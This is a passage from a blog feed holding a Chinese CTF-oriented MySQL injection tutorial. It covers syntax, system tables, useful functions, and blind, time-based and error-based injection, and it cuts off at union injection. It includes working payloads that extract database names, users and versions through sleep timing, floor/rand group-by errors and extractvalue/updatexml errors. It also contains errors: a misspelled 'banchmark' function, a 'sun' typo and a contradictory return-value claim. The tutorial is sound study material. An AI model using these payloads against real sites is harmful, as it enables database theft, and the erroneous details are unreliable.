href="https://258369123.github.io/2025/01/24/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/">PHP原生类介绍</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/01/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/">PHP伪协议介绍</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/01/28/Mysql%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">Mysql注入指北</a></li><li><input disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/01/26/MongDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">MongDB注入指北</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/01/27/%E8%AE%BADNS/">论DNS</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/02/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/">反序列化之字符串逃逸</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/02/15/zip%E6%96%87%E4%BB%B6%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/">zip文件逃逸漏洞</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/02/15/linux%E6%8F%90%E6%9D%83/">linux提权</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/2025/02/15/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/">php伪随机数</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>导航</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mysql注入指北</title>
    <link href="/2025/01/28/Mysql%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/"/>
    <url>/2025/01/28/Mysql%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<p>祝大家新年快乐</p><p>sql注入和xss并称为落魄的漏洞之王，虽然被研究的透透的了，但是现在的ctf比赛还是存在很多这样的题目，各种各样的 payload，不但琐碎而且不成体系,实际上很多技巧都是根据语法来的。即如果知道基本语法，那么对注入的 payload 也就能了然于胸</p><h1 id="Mysql注入学习"><a href="#Mysql注入学习" class="headerlink" title="Mysql注入学习"></a>Mysql注入学习</h1><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20190407031440214.png" alt="20190407031440214"></p><p>首先，语法为从上到下。</p><p>简化之前的导图为 MySQL 所有的语法。其实在注入的过程中用不着这么详细，看看就好，有需要再查也不迟。简化的版本则为 MySQL 注入中常见的语法。</p><p>颜色表示：红色代表一定不能省略，橙色代表部分情况下能省略，灰色代表总是可以省略。红色与灰色好懂，橙色是个啥呢？拿 <code>GROUP BY</code> 为例，意思指的是，假如我们选了 <code>GROUP BY</code>，那么一定要对 <code>col_name</code>、<code>expr</code>、<code>position</code> 进行三选一。根据从上到下的顺序，接下来是 <code>ASC</code>、<code>DESC</code> 二选一，可选可不选。如果我们没使用 <code>GROUP BY</code>，那么就不需要进行三选一，因为流程没到这里。总结起来就是，如果下一步中存在橙色的语法，就一定要用到。</p><h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><ol><li>group by：select + group by 的时候，是先 group by，再从 group by 里 select。所以 select 的列一定要在 group by 里存在。</li><li>语句执行成功返回值有2种情况，第一种本身返回数字的，就为数字，即：<code>select (select database());</code> 的返回值为 1；否则，执行成功为 0，反之为 1。即：<code>select (select database());</code> 的返回值为 0</li></ol><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>系统自带的数据库往往是很有用的，数据不仅全面，而且权限高的很。</p><h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h3><p><code>information_schema</code> 提供了访问数据库元数据的方式。什么是<code>元数据</code>呢？就是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。</p><p>有用的表如下：</p><ul><li>schemata：提供了当前 mysql 实例中所有数据库的信息。’show databases;<code>的结果就是从这个表的</code>SCHEMA_NAME&#96; 字段来的。</li><li>tables：详细记载了所有的表的名字，以及哪个表属于哪个 schema、表的类型、表的引擎、创建时间等等信息。<code>show tables</code> 的结果就是从这个表的 <code>TABLE_NAME</code> 字段来的。</li></ul><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p><code>mysql</code> 数据库是 mysql 的核心数据库，，主要负责存储数据库的用户、权限设置、关键字等 mysql 自己需要使用的控制和管理信息。</p><p>有用的表如下：</p><ul><li>user：<code>user</code> 表中记录了用户信息，包括用户可登陆的 ip（host 字段）、用户名（User 字段）、密码 hash（authentication_string 字段）、是否有读取文件的权限（file_priv 字段）等等。注意，对于 mysql <code>5.7</code> 以上的版本，密码的 hash 字段不再是 <code>Password</code>，而是 <code>authentication_string</code>。</li></ul><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>MySQL 自带的变量的特征就是开头 <code>@@</code></p><ol><li><code>@@basedir</code>：MySQL 的安装路径</li><li><code>@@datadir</code>： MySQL 的数据库文件，即数据文件路径</li><li><code>@@version_compile_os</code>：操作系统</li><li><code>@@version</code>：数据库版本</li></ol><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>这些函数在注入的过程中能帮助我们不少忙。参数通常可以为 sql 语句（要加括号）</p><h3 id="特殊函数"><a href="#特殊函数" class="headerlink" title="特殊函数"></a>特殊函数</h3><ul><li><code>user()</code>：当前连接的数据库用户</li><li><code>version()</code>：数据库版本</li></ul><h3 id="字符串相关函数"><a href="#字符串相关函数" class="headerlink" title="字符串相关函数"></a>字符串相关函数</h3><ul><li><p>mid：</p><ul><li><p>截取字符串的一部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mid(string, start[, length])<br></code></pre></td></tr></table></figure><ul><li>string：字符串，</li><li>start：起始位置，起始位置为 1</li><li>length：截取长度</li></ul></li></ul></li><li><p>substr：</p><ul><li><p>截取字符串的一部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">substr(string, start, length)<br></code></pre></td></tr></table></figure><ul><li>string：字符串</li><li>start：起始位置，起始位置为 1</li><li>length：截取长度</li></ul></li></ul></li><li><p>substring：同 <code>substr</code></p></li></ul><p><strong>以上函数的参数均可以用 <code>from start for end</code> 代替</strong>，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select substring(&#x27;fuck&#x27; from 2 for 2);#从第二个字符开始截取长度是2<br>+--------------------------------+<br>| substring(&#x27;fuck&#x27; from 2 for 2) |<br>+--------------------------------+<br>| uc                             |<br>+--------------------------------+<br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure><ul><li><p>hex：将数字&#x2F;字符串转为<code>十六进制</code>。特别是字符串，防止有特殊字符导致出现各种奇怪的问题。</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">hex(char)<br></code></pre></td></tr></table></figure></li><li><p>unhex：将十六进制转为字符串。注意，结果会直接转为对应的 acii 码，例如 <code>unhex(6D7973716C)</code> 的结果是 <code>mysql</code> 而不是 <code>470189044076</code></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">unhex(data)<br></code></pre></td></tr></table></figure></li><li><p>length：</p><ul><li><p>返回字符串长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">length(string)<br></code></pre></td></tr></table></figure><ul><li>string：字符串</li></ul></li></ul></li><li><p>left：</p><ul><li><p>获取字符串左边数起指定个数的字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">left(string, n)<br></code></pre></td></tr></table></figure><ul><li>string：要截取的字符串</li><li>n：长度</li></ul></li></ul></li><li><p>ord：</p><ul><li><p>获取字符的 ASCII 码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ord(char)<br></code></pre></td></tr></table></figure><ul><li>char：字符&#x2F;字符串（如果是字符串，则取它的第一个字符）</li></ul></li></ul></li><li><p>ascii：同 <code>ord</code></p></li><li><p>char：</p><ul><li><p>将 ASCII 码转为字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">char(a[, ...])<br></code></pre></td></tr></table></figure><ul><li>a：数字；后面可以加多个 ASCII 码，即构成字符串。</li></ul></li></ul></li><li><p>regexp：</p><ul><li><p>正则匹配，匹配到返回 1，反之为 0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">string1 regexp string2<br></code></pre></td></tr></table></figure><ul><li>string1：匹配的字符串</li><li>string2：正则表达式</li></ul></li></ul></li><li><p>concat：</p><ul><li><p>连接（多个）字符串（数字），返回字符串。如果有任何一个参数为 null，则返回值为 null</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">concat(string[, ...])<br></code></pre></td></tr></table></figure><ul><li>string：任意值</li></ul></li></ul></li><li><p>concat_ws</p><ul><li><p>和 concat 类似，将多个字符串连接成一个字符串，但是可以指定连接符。如果有任何一个参数为 null，对返回值无影响</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">concat_ws(sep, string[, ...])<br></code></pre></td></tr></table></figure><ul><li>sep：连接符</li><li>string：任意值</li></ul></li></ul></li><li><p>group_concat</p><ul><li><p>将 group by 产生的同一个分组中的值连接起来，成为一个字符串并返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">group_concat([distinct] colname [order by colname asc/desc ][separator sep])<br></code></pre></td></tr></table></figure><ul><li>distinct：去重</li><li>colname：列名</li><li>sep：分隔符</li></ul></li></ul></li></ul><h3 id="延时函数"><a href="#延时函数" class="headerlink" title="延时函数"></a>延时函数</h3><ul><li><p>sleep：</p><ul><li><p>延迟</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">sleep(sec)<br></code></pre></td></tr></table></figure><ul><li>sec：秒</li></ul></li></ul></li><li><p>banchmark：</p><ul><li><p>重复执行函数，较占用 cpu</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">banchmark(count, func)<br></code></pre></td></tr></table></figure><ul><li>count：执行的次数</li><li>func：函数</li></ul></li></ul></li><li><p><strong>笛卡尔积</strong></p><p> 笛卡尔积(因为连接表是一个很耗时的操作)</p><p> AxB&#x3D;A和B中每个元素的组合所组成的集合，就是连接表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT count(*) FROM information_schema.columns A, <br>information_schema.columns B, information_schema.tables C;<br>select * from table_name A, table_name B<br>select * from table_name A, table_name B，table_name C<br>select count(*) from table_name A, table_name B，table_name C <br></code></pre></td></tr></table></figure><p> 表可以是同一张表,受服务器性能影响很大</p></li></ul><p>另外，利用 <code>带外通道</code> 发起网络请求，也有可能造成时延。不过 MySQL 的带外通道只能在 Windows 下利用 <code>LOAD_FILE</code> 完成。</p><h3 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h3><ul><li><p><strong>ABS(x)</strong></p><ul><li>返回 <code>x</code> 的绝对值。</li><li>示例：<code>select abs(-5);</code> → 结果 <code>5</code></li></ul></li><li><p><strong>CEIL(x)</strong> 或 <strong>CEILING(x)</strong></p><ul><li>返回不小于 <code>x</code> 的最小整数（向上取整）。</li><li>示例：<code>select ceil(3.2);</code> → 结果 <code>4</code></li></ul></li><li><p><strong>FLOOR(x)</strong></p><ul><li>返回不大于 <code>x</code> 的最大整数（向下取整）。</li><li>示例：<code>select floor(3.8);</code> → 结果 <code>3</code></li></ul></li><li><p><strong>ROUND(x, d)</strong></p><ul><li>将 <code>x</code> 四舍五入到 <code>d</code> 位小数（默认为 <code>d=0</code>）。</li><li>示例：<code>select round(3.1415, 2);</code> → 结果 <code>3.14</code></li></ul></li><li><p><strong>RAND()</strong></p><ul><li><p>生成 0 到 1 之间的随机浮点数。</p></li><li><p>示例：<code>select rand();</code> → 结果类似 <code>0.5487</code></p></li><li><p>生成范围随机整数（如 1-100）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select floor(rand() * 100) + 1;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>POW(x, y)</strong> 或 <strong>POWER(x, y)</strong></p><ul><li>返回 <code>x</code> 的 <code>y</code> 次方。</li><li>示例：<code>select pow(2, 3);</code> → 结果 <code>8</code></li></ul></li><li><p><strong>SQRT(x)</strong></p><ul><li>返回 <code>x</code> 的平方根（若 <code>x</code> 为负数，返回 <code>NULL</code>）。</li><li>示例：<code>select sqrt(16);</code> → 结果 <code>4</code></li></ul></li></ul><h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><ol><li><p><strong>COUNT()</strong></p><ul><li><p>统计行数或非 NULL 值的数量。</p></li><li><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- 统计总行数（包括NULL）<br>select count(*) from orders;<br><br>-- 统计某列非NULL值的数量<br>select count(product_id) from products;<br><br>-- 统计唯一值数量<br>select count(distinct user_id) from logs;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>SUM()</strong></p><ul><li><p>计算数值列的总和（忽略 NULL）。</p></li><li><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select sun(revenue) from sales;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>AVG()</strong></p><ul><li><p>计算数值列的平均值（忽略 NULL）。</p></li><li><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select avg(score) from exams;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>MAX()</strong> 和 <strong>MIN()</strong></p><ul><li><p>返回列中的最大&#x2F;最小值（支持数值、日期、字符串）。</p></li><li><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select max(temperature), min(temperature) from weather;<br></code></pre></td></tr></table></figure></li></ul></li></ol><h3 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h3><ul><li><p>greatest：</p><ul><li><p>返回 a, b 中最大的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">greatest(a, b)<br></code></pre></td></tr></table></figure><ul><li>a、b：任意值</li></ul></li></ul></li><li><p>rand：</p><ul><li><p>返回 0~1 之间随机的浮点值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">rand(a)<br></code></pre></td></tr></table></figure><ul><li>a：可选参数；随机数种子；可为任意值</li></ul></li></ul></li><li><p>load_file</p><ul><li><p>读取文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">load_file(path)<br></code></pre></td></tr></table></figure><ul><li>path：文件路径，一般转为 16 进制防止特殊字符出问题</li></ul></li></ul></li><li><p>extractvalue</p><ul><li><p>对 XML 文档进行查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">extractvalue(xmlfile，path)<br></code></pre></td></tr></table></figure><ul><li>xmlfile：xml 文件</li><li>path：xpath</li></ul></li></ul></li><li><p>updatexml</p><ul><li><p>更新 xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">updatexml(xmlfile，path, content)<br></code></pre></td></tr></table></figure><ul><li>xmlfile：xml 文件</li><li>path：xpath</li><li>content：更新的内容</li></ul></li></ul></li></ul><h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><p>到此为止，我们基本上复习了一下 MySQL 注入相关的知识，接下来看看有哪些类型的注入。</p><h3 id="常规注入"><a href="#常规注入" class="headerlink" title="常规注入"></a>常规注入</h3><p>注入后直接回显结果</p><p>有点多写好了贴这里</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>类型</p><ul><li>布尔</li><li>时间</li><li>其他（报错、响应代码等等）</li></ul><p>盲注就是在 sql 注入过程中，数据无回显。此时，我们需要利用一些方法进行判断注入是否成功，这个方法称之为盲注。</p><p>盲注实际上是根据执行成功与失败的现象不同，导致攻击者能够获取到信息。最简单的是布尔型的，通过比较运算符来获得信息，比较结果要么是 True，要么是 False，两种返回的数据不同。那么如果不管是 True 还是 False，页面返回的都一样的话，就只能用基于时间的盲注，加入特定的时间函数，通过时间差来判断注入的语句是否正确。</p><p>从上面可以看出，只要注入成功与失败的返回数据不同，我们就可以获取到数据库的信息。至于返回的数据到底怎么个不同法，则有很多种可能。</p><p>利用方式</p><ol><li><p>基于布尔<br>利用字符串相关的函数，逐个字符猜解需要的信息即可</p></li><li><p>基于时间</p><ul><li><p>利用 <code>if</code>、<code>case</code>等与时延函数搭配，逐个字符猜解需要的信息</p></li><li><p>利用字符串提前与定位将字符转为数字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where user=&#x27;&#x27; or sleep(locate(substr(user(), 1, 1), &#x27;a&#x27;));<br>select * from users where user=&#x27;&#x27; or sleep(locate(substr(user(), 1, 1), &#x27;b&#x27;));<br>...<br>select * from users where user=&#x27;&#x27; or sleep(locate(substr(user(), 1, 1), &#x27;r&#x27;));<br># 出现时延，代表第一个字符为 r<br></code></pre></td></tr></table></figure><p>同理可以获取所有位数。此法无需 if 等条件语句。</p><p>同样还可以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where user=&#x27;&#x27; or sleep(replace(substr(user(), 1, 1), &#x27;a&#x27;, 1));<br>select * from users where user=&#x27;&#x27; or sleep(replace(substr(user(), 1, 1), &#x27;b&#x27;, 1));<br>...<br>select * from users where user=&#x27;&#x27; or sleep(replace(substr(user(), 1, 1), &#x27;r&#x27;, 1));<br># 出现时延，代表第一个字符为 r<br></code></pre></td></tr></table></figure><p>判断长度也可以这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where user=&#x27;&#x27; or sleep(length(database())-1);<br>select * from users where user=&#x27;&#x27; or sleep(length(database())-2);<br>...<br>select * from users where user=&#x27;&#x27; or sleep(length(database())-14);<br># 没有时延说明长度为 14<br></code></pre></td></tr></table></figure></li></ul><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>利用 MySQL 的一些特殊语法触发错误，错误中常常带着一些数据库信息，从而造成信息泄露，达到注入的目的。以下是几个常见的 payload：</p><blockquote><p>floor + rand + count + group by 组合拳</p></blockquote><p>先说 <code>group by</code>。当 <code>group by</code> 与聚合函数（这里是 count）一起使用的时候，MySQL 会为查询结果建立一个虚拟的表。这个表你可以按照 Python 的里的字典理解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">tmp_table = &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>与字典类似，这个临时的表不能创建相同的键，出现了就报错；如果出现相同的值，则累加。举例：<br>假如查出了一个新的值 a，那么 MySQL 先找一下临时表中有没有这个 a 键，有的话更新对于的值；否则创建一个新的键。如果创建新的键的时候发现已经存在这个键了，则会报错。那么问题来了，创建键的之前明明有对键的存在进行判断，为什么创建的时候还会出现存在呢？因为判断的时候 MySQL 会进行一次查询，而创建的时候又会查一下，相当于重复查了 2 次。又因为 <code>rand</code> 函数每次运行的结果不同，便导致了判断与创建的键会不一致的情况。</p><p>当然，0~1 之间的随机浮点数结果太多了，需要限制一下来提高几率，这就是 <code>floor(rand()*2)</code> 的作用，将随机结果限制为2种，要么 0 要么 1。<br>举例说明，当 <code>group by</code> + <code>floor(rand(0)*2)</code> 的时候：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select floor(rand(0)*2) from information_schema.tables limit 0, 5;<br>+------------------+<br>| floor(rand(0)*2) |<br>+------------------+<br>|                0 |<br>|                1 |<br>|                1 |<br>|                0 |<br>|                1 |<br>+------------------+<br>5 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>结果解释：</p><ol><li>第一次查询，随机数为 0，<code>group by</code> 拿到键 0，判断键 0 不在临时表后，尝试新建键，这时消耗了一个随机数 1，所以这个时候实际上新建的键的是 1。</li><li>第二次查询，随机数为 1，<code>group by</code> 拿到键 1，判断键 1 在临时表后，更新键 1 对应的值。</li><li>第三次查询，随机数为 0，<code>group by</code> 拿到键 0，判断键 0 不在临时表后，尝试新建键，这时消耗了一个随机数 1，所以这个时候实际上新建的键的是 1，但是键 1已经存在，所以 MySQL 报错：<code>ERROR 1062 (23000): Duplicate entry &#39;1&#39; for key &#39;&lt;group_key&gt;&#39;</code></li></ol><p>验证如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users;<br>+------+----------+----------+<br>| id   | user     | password |<br>+------+----------+----------+<br>|    1 | admin    | admin    |<br>|    2 | root     | password |<br>|    3 | username | 123456   |<br>+------+----------+----------+<br>3 rows in set (0.00 sec)<br><br>mysql&gt; select count(*) from users group by (floor(rand(0)*2));<br>ERROR 1062 (23000): Duplicate entry &#x27;1&#x27; for key &#x27;&lt;group_key&gt;&#x27;<br><br></code></pre></td></tr></table></figure><p>实际上，group by 的次数与列数密切相关，也就是说，如果将 <code>users</code> 表改为 2列，则不会报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users;<br>+------+-------+----------+<br>| id   | user  | password |<br>+------+-------+----------+<br>|    1 | admin | admin    |<br>|    2 | root  | password |<br>+------+-------+----------+<br>2 rows in set (0.00 sec)<br><br>mysql&gt; select count(*) from users group by (floor(rand(0)*2));<br>+----------+<br>| count(*) |<br>+----------+<br>|        2 |<br>+----------+<br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>剩下的，就是怎么利用报错将需要的数据带出来。报错中的 <code>1</code> 实际上就是 <code>floor(rand(0)*2)</code> 的结果，所以只需要将数据与 <code>floor(rand(0)*2)</code> 连接起来就可以带出来了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select count(*) from users group by concat((floor(rand(0)*2)), &quot;~&quot;,version());<br>ERROR 1062 (23000): Duplicate entry &#x27;1~5.7.24&#x27; for key &#x27;&lt;group_key&gt;&#x27;<br></code></pre></td></tr></table></figure><p>实战示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=1 or 1 group by concat((floor(rand(0)*2)), &quot;~&quot;, version()) -- #<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">version() 也可以为 group_concat( select 语句 )<br></code></pre></td></tr></table></figure><blockquote><p>xml</p></blockquote><p>利用 xml 的 xpath 语法错误来报错。</p><p><strong>extractvalue</strong>: extractvalue 在查不到数据的时候返回空，xpath 语法错误的时候则会报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;/&#x27;);<br>+--------------------------+<br>| extractvalue(&#x27;123&#x27;, &#x27;/&#x27;) |<br>+--------------------------+<br>| 123                      |<br>+--------------------------+<br>1 row in set (0.00 sec)<br><br>mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;/a&#x27;);<br>+---------------------------+<br>| extractvalue(&#x27;123&#x27;, &#x27;/a&#x27;) |<br>+---------------------------+<br>|                           |<br>+---------------------------+<br>1 row in set (0.00 sec)<br><br>mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;~&#x27;);<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~&#x27;<br></code></pre></td></tr></table></figure><p><strong>updatexml</strong>：与 extractvalue 类似。</p><p>注意，这两种报错注入，能够提取的最长字符串为 32 个字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;);<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;<br>mysql&gt; select updatexml(&#x27;123&#x27;, &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;, &#x27;1&#x27;);<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;<br></code></pre></td></tr></table></figure><p>~替换为select语句</p><p>实战示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users where id=1 and extractvalue(&#x27;&#x27;, concat(&#x27;~&#x27;, database(), &#x27;~&#x27;));<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~test~&#x27;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users where id=1 and updatexml(&#x27;&#x27;, concat(&#x27;~&#x27;, database(), &#x27;~&#x27;), &#x27;&#x27;); <br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~test~&#x27;<br></code></pre></td></tr></table></figure><blockquote><p>其他函数</p></blockquote><p>上面这几个仅仅是比较常见的函数，实际上还有很多不常见的</p><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>利用 <code>union</code> 来拼接 select 语句。主要是判断列数。</p><h3 